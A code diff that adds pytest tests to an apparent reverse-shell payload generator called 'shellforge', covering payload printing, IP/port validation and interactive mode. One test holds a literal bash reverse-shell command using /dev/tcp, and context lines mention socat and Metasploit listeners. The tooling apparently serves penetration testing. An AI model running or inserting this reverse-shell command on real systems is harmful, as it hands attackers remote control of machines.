@@ -165,3 +165,51 @@ def test_listener_commands() -> None:
     assert f"tcp-listen:{PORT}" in text
     assert "multi/handler" in text
     assert str(PORT) in text
+
+
+def test_print_payload_is_copy_safe(capsys) -> None:
+    """Payload must be plain text — no box-drawing characters."""
+    import shellforge as sf
+
+    payload = f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
+    sf._print_payload("REVERSE | bash", payload)
+    out = capsys.readouterr().out
+    assert payload in out
+    for ch in "┌┐└┘│─╔╗╚╝║":
+        assert ch not in out
+    assert "Payload (copy the line below):" in out
+
+
+def test_interactive_ip_port_validation() -> None:
+    from interactive import validate_ip, validate_port
+
+    assert validate_ip("10.10.14.5")
+    assert validate_ip("127.0.0.1")
+    assert not validate_ip("")
+    assert not validate_ip("999.1.1.1")
+    assert validate_port("4444") == 4444
+    assert validate_port("0") is None
+    assert validate_port("65536") is None
+    assert validate_port("abc") is None
+
+
+def test_main_empty_argv_starts_interactive(monkeypatch) -> None:
+    """No CLI args should enter interactive mode."""
+    import shellforge as sf
+
+    called = {}
+
+    def fake_interactive(*, show_banner=True, sf=None):
+        called["ok"] = True
+        called["banner"] = show_banner
+        return 0
+
+    monkeypatch.setattr("interactive.run_interactive", fake_interactive)
+    # Also patch where main imports it from
+    import interactive as interactive_mod
+
+    monkeypatch.setattr(interactive_mod, "run_interactive", fake_interactive)
+
+    rc = sf.main([])
+    assert rc == 0
+    assert called.get("ok") is True
